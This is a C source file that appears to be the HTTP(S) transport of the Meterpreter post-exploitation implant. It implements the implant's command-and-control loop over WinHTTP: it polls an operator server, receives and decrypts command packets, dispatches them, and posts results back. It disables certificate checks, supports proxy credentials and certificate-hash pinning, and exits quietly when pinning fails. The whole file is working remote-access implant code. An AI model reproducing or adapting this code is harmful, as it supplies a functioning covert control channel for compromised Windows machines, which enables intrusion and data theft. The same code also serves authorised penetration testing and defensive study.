/*!
 * @file server_transport_tcp.c
 * @remark This file doesn't use precompiled headers because metsrv.h includes a bunch of
 *         of definitions that clash with those found in winhttp.h. Hooray Win32 API. I hate you.
 */
#include "../../common/common.h"
#include <winhttp.h>

#define HOSTNAME_LEN 512
#define URLPATH_LEN 1024
#define METERPRETER_CONST_OFFSET 12

/*!
 * @brief Prepare a winHTTP request with the given context.
 * @param ctx Pointer to the HTTP transport context to prepare the request from.
 * @param direction String representing the direction of the communications (for debug).
 * @return An Internet request handle.
 */
static HINTERNET get_winhttp_req(HttpTransportContext *ctx, const char *direction)
{
	HINTERNET hReq = NULL;
	DWORD flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

	if (ctx->ssl)
	{
		flags |= WINHTTP_FLAG_SECURE;
		dprintf("[%s] Setting secure flag..", direction);
	}

	vdprintf("[%s] opening request on connection %x to %S", direction, ctx->connection, ctx->uri);
	hReq = WinHttpOpenRequest(ctx->connection, L"POST", ctx->uri, NULL, NULL, NULL, flags);

	if (hReq == NULL)
	{
		dprintf("[%s] Failed WinHttpOpenRequest: %d", direction, GetLastError());
		SetLastError(ERROR_NOT_FOUND);
		return NULL;
	}

	if (ctx->proxy_user)
	{
		dprintf("[%s] Setting proxy username to %S", direction, ctx->proxy_user);
		dprintf("[%s] Setting proxy password to %S", direction, ctx->proxy_pass);
		if (!WinHttpSetCredentials(hReq, WINHTTP_AUTH_TARGET_PROXY, WINHTTP_AUTH_SCHEME_BASIC,
			ctx->proxy_user, ctx->proxy_pass, NULL))
		{
			dprintf("[%s] Failed to set creds %u", direction, GetLastError());
		}
	}

	if (ctx->ssl)
	{
		flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
			| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
			| SECURITY_FLAG_IGNORE_CERT_CN_INVALID
			| SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
		if (!WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
		{
			dprintf("[%s] failed to set the security flags on the request", direction);
		}
	}

	return hReq;
}

/*!
 * @brief Windows-specific function to transmit a packet via HTTP(s) using winhttp _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available on POSIX.
 */
static DWORD packet_transmit_via_http_winhttp(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	DWORD res = 0;
	HINTERNET hReq;
	BOOL hRes;
	DWORD retries = 5;
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
	unsigned char *buffer;

	buffer = malloc(packet->payloadLength + sizeof(TlvHeader));
	if (!buffer)
	{
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}

	memcpy(buffer, &packet->header, sizeof(TlvHeader));
	memcpy(buffer + sizeof(TlvHeader), packet->payload, packet->payloadLength);

	do
	{
		hReq = get_winhttp_req(ctx, "PACKET TRANSMIT");
		if (hReq == NULL)
		{
			break;
		}

		hRes = WinHttpSendRequest(hReq, NULL, 0, buffer,
			packet->payloadLength + sizeof(TlvHeader),
			packet->payloadLength + sizeof(TlvHeader), 0);

		if (!hRes)
		{
			dprintf("[PACKET TRANSMIT] Failed HttpSendRequest: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		dprintf("[PACKET TRANSMIT] request sent.. apparently");
	} while(0);

	memset(buffer, 0, packet->payloadLength + sizeof(TlvHeader));
	WinHttpCloseHandle(hReq);
	return res;
}

/*!
 * @brief Transmit a packet via HTTP(s) _and_ destroy it.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_transmit_via_http(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
{
	CryptoContext *crypto;
	Tlv requestId;
	DWORD res;

	lock_acquire(remote->lock);

	// If the packet does not already have a request identifier, create one for it
	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
	{
		DWORD index;
		CHAR rid[32];

		rid[sizeof(rid)-1] = 0;

		for (index = 0; index < sizeof(rid)-1; index++)
		{
			rid[index] = (rand() % 0x5e) + 0x21;
		}

		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
	}

	do
	{
		// If a completion routine was supplied and the packet has a request
		// identifier, insert the completion routine into the list
		if ((completion) &&
			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
			&requestId) == ERROR_SUCCESS))
		{
			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
		}

		// If the endpoint has a cipher established and this is not a plaintext
		// packet, we encrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(packet) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = packet->payloadLength;
			PUCHAR origPayload = packet->payload;

			// Encrypt
			if ((res = crypto->handlers.encrypt(crypto, packet->payload,
				packet->payloadLength, &packet->payload,
				&packet->payloadLength)) !=
				ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// Destroy the original payload as we no longer need it
			free(origPayload);

			// Update the header length
			packet->header.length = htonl(packet->payloadLength + sizeof(TlvHeader));
		}

		dprintf("[PACKET] Transmitting packet of length %d to remote", packet->payloadLength);
		res = packet_transmit_via_http_winhttp(remote, packet, completion);
		if (res < 0)
		{
			dprintf("[PACKET] transmit failed with return %d\n", res);
			break;
		}

		SetLastError(ERROR_SUCCESS);
	} while (0);

	res = GetLastError();

	// Destroy the packet
	packet_destroy(packet);

	lock_release(remote->lock);

	return res;
}

/*!
 * @brief Windows-specific function to receive a new packet via WinHTTP.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available in POSIX.
 */
static DWORD packet_receive_http_via_winhttp(Remote *remote, Packet **packet)
{
	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
	CryptoContext *crypto = NULL;
	Packet *localPacket = NULL;
	TlvHeader header;
	LONG bytesRead;
	BOOL inHeader = TRUE;
	PUCHAR payload = NULL;
	ULONG payloadLength;
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	HINTERNET hReq;
	BOOL hRes;
	DWORD retries = 5;

	lock_acquire(remote->lock);

	do
	{
		hReq = get_winhttp_req(ctx, "PACKET RECEIVE");
		if (hReq == NULL)
		{
			break;
		}

		vdprintf("[PACKET RECEIVE WINHTTP] sending the 'RECV' command...");
		// TODO: when the MSF side supports it, update this so that it's UTF8
		DWORD recv = 'VCER';
		hRes = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, &recv,
			sizeof(recv), sizeof(recv), 0);

		if (!hRes)
		{
			dprintf("[PACKET RECEIVE WINHTTP] Failed WinHttpSendRequest: %d %d", GetLastError(), WSAGetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		vdprintf("[PACKET RECEIVE WINHTTP] Waiting to see the response ...");
		if (!WinHttpReceiveResponse(hReq, NULL))
		{
			vdprintf("[PACKET RECEIVE] Failed WinHttpReceiveResponse: %d", GetLastError());
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		if (ctx->cert_hash != NULL)
		{
			vdprintf("[PACKET RECEIVE WINHTTP] validating certificate hash");
			PCERT_CONTEXT pCertContext = NULL;
			DWORD dwCertContextSize = sizeof(pCertContext);

			if (!WinHttpQueryOption(hReq, WINHTTP_OPTION_SERVER_CERT_CONTEXT, &pCertContext, &dwCertContextSize))
			{
				dprintf("[PACKET RECEIVE WINHTTP] Failed to get the certificate context: %u", GetLastError());
				SetLastError(ERROR_WINHTTP_SECURE_INVALID_CERT);
				break;
			}

			DWORD dwHashSize = 20;
			BYTE hash[20];
			if (!CertGetCertificateContextProperty(pCertContext, CERT_SHA1_HASH_PROP_ID, hash, &dwHashSize))
			{
				dprintf("[PACKET RECEIVE WINHTTP] Failed to get the certificate hash: %u", GetLastError());
				SetLastError(ERROR_WINHTTP_SECURE_INVALID_CERT);
				break;
			}

			if (memcmp(hash, ctx->cert_hash, CERT_HASH_SIZE) != 0)
			{
				dprintf("[SERVER] Server hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
					hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7], hash[8], hash[9], hash[10],
					hash[11], hash[12], hash[13], hash[14], hash[15], hash[16], hash[17], hash[18], hash[19]);

				dprintf("[PACKET RECEIVE WINHTTP] Certificate hash doesn't match, bailing out");
				SetLastError(ERROR_WINHTTP_SECURE_INVALID_CERT);
				break;
			}
		}

#ifdef DEBUGTRACE
		DWORD dwSize = 0;
		if (!WinHttpQueryDataAvailable(hReq, &dwSize))
		{
			vdprintf("[PACKET RECEIVE WINHTTP] WinHttpQueryDataAvailable failed: %x", GetLastError());
		}
		else
		{
			vdprintf("[PACKET RECEIVE WINHTTP] Available data: %u bytes", dwSize);
		}
#endif

		// Read the packet length
		retries = 3;
		vdprintf("[PACKET RECEIVE WINHTTP] Start looping through the receive calls");
		while (inHeader && retries > 0)
		{
			retries--;
			if (!WinHttpReadData(hReq, (PUCHAR)&header + headerBytes, sizeof(TlvHeader)-headerBytes, &bytesRead))
			{
				dprintf("[PACKET RECEIVE] Failed HEADER WinhttpReadData: %d", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			vdprintf("[PACKET RECEIVE WINHTTP] Data received: %u bytes", bytesRead);

			// If the response contains no data, this is fine, it just means the
			// remote side had nothing to tell us. Indicate this through a
			// ERROR_EMPTY response code so we can update the timestamp.
			if (bytesRead == 0)
			{
				SetLastError(ERROR_EMPTY);
				break;
			}

			headerBytes += bytesRead;

			if (headerBytes != sizeof(TlvHeader))
			{
				continue;
			}

			inHeader = FALSE;
		}

		if (GetLastError() == ERROR_EMPTY)
		{
			break;
		}

		if (headerBytes != sizeof(TlvHeader))
		{
			dprintf("[PACKET RECEIVE WINHTTP] headerBytes no valid");
			SetLastError(ERROR_NOT_FOUND);
			break;
		}

		// Initialize the header
		vdprintf("[PACKET RECEIVE WINHTTP] initialising header");
		header.length = header.length;
		header.type = header.type;
		payloadLength = ntohl(header.length) - sizeof(TlvHeader);
		payloadBytesLeft = payloadLength;

		// Allocate the payload
		if (!(payload = (PUCHAR)malloc(payloadLength)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Read the payload
		retries = payloadBytesLeft;
		while (payloadBytesLeft > 0 && retries > 0)
		{
			vdprintf("[PACKET RECEIVE WINHTTP] reading more data from the body...");
			retries--;
			if (!WinHttpReadData(hReq, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, &bytesRead))
			{
				dprintf("[PACKET RECEIVE] Failed BODY WinHttpReadData: %d", GetLastError());
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			if (!bytesRead)
			{
				vdprintf("[PACKET RECEIVE WINHTTP] no bytes read, bailing out");
				SetLastError(ERROR_NOT_FOUND);
				break;
			}

			vdprintf("[PACKET RECEIVE WINHTTP] bytes read: %u", bytesRead);
			payloadBytesLeft -= bytesRead;
		}

		// Didn't finish?
		if (payloadBytesLeft)
		{
			break;
		}

		// Allocate a packet structure
		if (!(localPacket = (Packet *)malloc(sizeof(Packet))))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		memset(localPacket, 0, sizeof(Packet));

		// If the connection has an established cipher and this packet is not
		// plaintext, decrypt
		if ((crypto = remote_get_cipher(remote)) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_REQUEST) &&
			(packet_get_type(localPacket) != PACKET_TLV_TYPE_PLAIN_RESPONSE))
		{
			ULONG origPayloadLength = payloadLength;
			PUCHAR origPayload = payload;

			// Decrypt
			if ((res = crypto->handlers.decrypt(crypto, payload, payloadLength, &payload, &payloadLength)) != ERROR_SUCCESS)
			{
				SetLastError(res);
				break;
			}

			// We no longer need the encrypted payload
			free(origPayload);
		}

		localPacket->header.length = header.length;
		localPacket->header.type = header.type;
		localPacket->payload = payload;
		localPacket->payloadLength = payloadLength;

		*packet = localPacket;

		SetLastError(ERROR_SUCCESS);

	} while (0);

	res = GetLastError();

	// Cleanup on failure
	if (res != ERROR_SUCCESS)
	{
		if (payload)
		{
			free(payload);
		}
		if (localPacket)
		{
			free(localPacket);
		}
	}

	if (hReq)
	{
		WinHttpCloseHandle(hReq);
	}

	lock_release(remote->lock);

	return res;
}


/*!
 * @brief Initialise the HTTP(S) connection.
 * @param remote Pointer to the remote instance with the HTTP(S) transport details wired in.
 * @param sock Reference to the original socket FD passed to metsrv (ignored);
 * @return Indication of success or failure.
 */
static BOOL server_init_http(Remote* remote, SOCKET fd)
{
	URL_COMPONENTS bits;
	wchar_t tmpHostName[512];
	wchar_t tmpUrlPath[1024];
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	dprintf("[WINHTTP] Initialising ...");

	// configure proxy
	if (ctx->proxy && wcscmp(ctx->proxy, L"METERPRETER_PROXY") != 0)
	{
		dprintf("[DISPATCH] Configuring with proxy: %S", ctx->proxy);
		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_NAMED_PROXY, ctx->proxy, WINHTTP_NO_PROXY_BYPASS, 0);
	}
	else
	{
		ctx->internet = WinHttpOpen(ctx->ua, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	}

	if (!ctx->internet)
	{
		dprintf("[DISPATCH] Failed WinHttpOpen: %d", GetLastError());
		return FALSE;
	}

	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", ctx->internet);

	// The InternetCrackUrl method was poorly designed...
	ZeroMemory(tmpHostName, sizeof(tmpHostName));
	ZeroMemory(tmpUrlPath, sizeof(tmpUrlPath));

	ZeroMemory(&bits, sizeof(bits));
	bits.dwStructSize = sizeof(bits);

	bits.dwHostNameLength = HOSTNAME_LEN - 1;
	bits.lpszHostName = tmpHostName;

	bits.dwUrlPathLength = URLPATH_LEN - 1;
	bits.lpszUrlPath = tmpUrlPath;

	dprintf("[DISPATCH] About to crack URL: %S", remote->transport->url);
	WinHttpCrackUrl(remote->transport->url, 0, 0, &bits);

	SAFE_FREE(ctx->uri);
	ctx->uri = _wcsdup(tmpUrlPath);
	remote->transport->start_time = current_unix_timestamp();
	remote->transport->comms_last_packet = current_unix_timestamp();

	dprintf("[DISPATCH] Configured URI: %S", ctx->uri);
	dprintf("[DISPATCH] Host: %S Port: %u", tmpHostName, bits.nPort);

	// Allocate the connection handle
	ctx->connection = WinHttpConnect(ctx->internet, tmpHostName, bits.nPort, 0);
	if (!ctx->connection)
	{
		dprintf("[DISPATCH] Failed WinHttpConnect: %d", GetLastError());
		return FALSE;
	}

	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", ctx->connection);

	// Bring up the scheduler subsystem.
	return scheduler_initialize(remote) == ERROR_SUCCESS;
}

/*!
 * @brief Deinitialise the HTTP(S) connection.
 * @param remote Pointer to the remote instance with the HTTP(S) transport details wired in.
 * @return Indication of success or failure.
 */
static DWORD server_deinit_http(Remote* remote)
{
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	dprintf("[WINHTTP] Deinitialising ...");

	WinHttpCloseHandle(ctx->connection);
	WinHttpCloseHandle(ctx->internet);

	dprintf("[DISPATCH] calling scheduler_destroy...");
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...");
	command_join_threads();

	return TRUE;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using HTTP(S).
 * @param remote Pointer to the remote endpoint for this server connection.
 * @param dispatchThread Pointer to the main dispatch thread.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet* packet = NULL;
	THREAD* cpt = NULL;
	DWORD ecount = 0;
	DWORD delay = 0;
	Transport* transport = remote->transport;
	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

	while (running)
	{
		if (transport->timeouts.comms != 0 && transport->comms_last_packet + transport->timeouts.comms < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (transport->expiration_end != 0 && transport->expiration_end < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), transport->expiration_end);
			break;
		}

		if (event_poll(dispatchThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive_http_via_winhttp(remote, &packet);
		if (result != ERROR_SUCCESS)
		{
			// Update the timestamp for empty replies
			if (result == ERROR_EMPTY)
			{
				transport->comms_last_packet = current_unix_timestamp();
			}
			else if (result == ERROR_WINHTTP_SECURE_INVALID_CERT)
			{
				// This means that the certificate validation failed, and so
				// we don't trust who we're connecting with. Bail out, pretending
				// that it was clean
				result = ERROR_SUCCESS;
				break;
			}

			if (ecount < 10)
			{
				delay = 10 * ecount;
			}
			else
			{
				delay = 100 * ecount;
			}

			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep(min(10000, delay));
			continue;
		}

		transport->comms_last_packet = current_unix_timestamp();

		// Reset the empty count when we receive a packet
		ecount = 0;

		dprintf("[DISPATCH] Returned result: %d", result);

		running = command_handle(remote, packet);
		dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
	}

	return result;
}

/*!
 * @brief Destroy the HTTP(S) transport.
 * @param transport Pointer to the HTTP(S) transport to reset.
 */
static void transport_destroy_http(Remote* remote)
{
	if (remote && remote->transport && remote->transport->type != METERPRETER_TRANSPORT_SSL)
	{
		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;

		dprintf("[TRANS HTTP] Destroying http transport for url %S", remote->transport->url);

		if (ctx)
		{
			SAFE_FREE(ctx->cert_hash);
			SAFE_FREE(ctx->proxy);
			SAFE_FREE(ctx->proxy_pass);
			SAFE_FREE(ctx->proxy_user);
			SAFE_FREE(ctx->ua);
			SAFE_FREE(ctx->uri);
		}
		SAFE_FREE(remote->transport->url);
		SAFE_FREE(remote->transport->ctx);
		SAFE_FREE(remote->transport);
	}
}

/*!
 * @brief Create an HTTP(S) transport from the given settings.
 * @param ssl Indication of whether to use SSL or not.
 * @param url URL for the HTTP(S) session.
 * @param ua User agent to use for requests.
 * @param proxy Proxy server information (can be NULL).
 * @param proxyUser Proxy user name (can be NULL).
 * @param proxyPass Proxy password (can be NULL).
 * @param certHash Expected SHA1 hash of the MSF server (can be NULL).
 * @param timeouts The timeout values to use for this transport.
 * @return Pointer to the newly configured/created HTTP(S) transport instance.
 */
Transport* transport_create_http(BOOL ssl, wchar_t* url, wchar_t* ua, wchar_t* proxy,
	wchar_t* proxyUser, wchar_t* proxyPass, PBYTE certHash, TimeoutSettings* timeouts)
{
	Transport* transport = (Transport*)malloc(sizeof(Transport));
	HttpTransportContext* ctx = (HttpTransportContext*)malloc(sizeof(HttpTransportContext));

	dprintf("[TRANS HTTP] Creating http transport for url %S", url);

	memset(transport, 0, sizeof(Transport));
	memset(ctx, 0, sizeof(HttpTransportContext));

	memcpy(&transport->timeouts, timeouts, sizeof(transport->timeouts));

	SAFE_FREE(ctx->ua);
	if (ua)
	{
		ctx->ua = _wcsdup(ua);
	}
	SAFE_FREE(ctx->proxy);
	if (proxy && wcscmp(proxy + METERPRETER_CONST_OFFSET, L"PROXY") != 0)
	{
		ctx->proxy = _wcsdup(proxy);
	}
	SAFE_FREE(ctx->proxy_user);
	if (proxyUser && wcscmp(proxyUser + METERPRETER_CONST_OFFSET, L"USERNAME_PROXY") != 0)
	{
		ctx->proxy_user = _wcsdup(proxyUser);
	}
	SAFE_FREE(ctx->proxy_pass);
	if (proxyPass && wcscmp(proxyPass + METERPRETER_CONST_OFFSET, L"PASSWORD_PROXY") != 0)
	{
		ctx->proxy_pass = _wcsdup(proxyPass);
	}
	ctx->ssl = ssl;

	// only apply the cert hash if we're given one and it's not the global value
	SAFE_FREE(ctx->cert_hash);
	if (certHash && strncmp((char*)(certHash + METERPRETER_CONST_OFFSET), "SSL_CERT_HASH", 20) != 0)
	{
		ctx->cert_hash = (PBYTE)malloc(sizeof(BYTE) * 20);
		memcpy(ctx->cert_hash, certHash, 20);
	}

	transport->type = ssl ? METERPRETER_TRANSPORT_HTTPS : METERPRETER_TRANSPORT_HTTP;
	transport->url = _wcsdup(url);
	transport->packet_transmit = packet_transmit_via_http;
	transport->server_dispatch = server_dispatch_http;
	transport->transport_init = server_init_http;
	transport->transport_deinit = server_deinit_http;
	transport->transport_destroy = transport_destroy_http;
	transport->ctx = ctx;
	transport->expiration_end = current_unix_timestamp() + transport->timeouts.expiry;
	transport->start_time = current_unix_timestamp();
	transport->comms_last_packet = current_unix_timestamp();

#ifdef DEBUGTRACE
	if (ssl && certHash)
	{
		PBYTE hash = certHash;
		dprintf("[SERVER] Using HTTPS transport: Hash set to: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
			hash[0], hash[1], hash[2], hash[3], hash[4], hash[5], hash[6], hash[7], hash[8], hash[9], hash[10],
			hash[11], hash[12], hash[13], hash[14], hash[15], hash[16], hash[17], hash[18], hash[19]);
		dprintf("[SERVER] is validating hashes %p", hash);
	}
#endif

	return transport;
}
